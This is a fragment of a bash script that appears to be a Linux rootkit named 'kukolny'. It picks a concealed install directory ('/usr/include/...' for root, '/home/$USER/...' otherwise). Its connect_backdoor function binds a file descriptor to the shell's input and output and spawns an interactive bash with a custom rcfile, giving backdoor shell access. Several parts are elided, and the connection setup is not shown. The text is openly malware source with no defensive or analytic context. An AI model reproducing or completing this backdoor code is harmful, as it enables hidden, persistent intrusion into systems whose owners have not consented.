#!/bin/bash
. kukolny.cfg
declare KUKOLNY_PATH
function set_rootkit_path() {
    if [ $UID -eq 0 ] || [ $EUID -eq 0 ]
        then KUKOLNY_PATH="/usr/include/..."
        else KUKOLNY_PATH="/home/$USER/..."
    fi
}
...
function connect_backdoor() {
    ...
    while true; do
		...
		if [ $? -ne 0 ];then exit 0;else exec 0<&9;fi; exec 1>&9 2>&1
        ...
        else /bin/bash --rcfile "$KUKOLNY_PATH"/.bdrc --noprofile -i
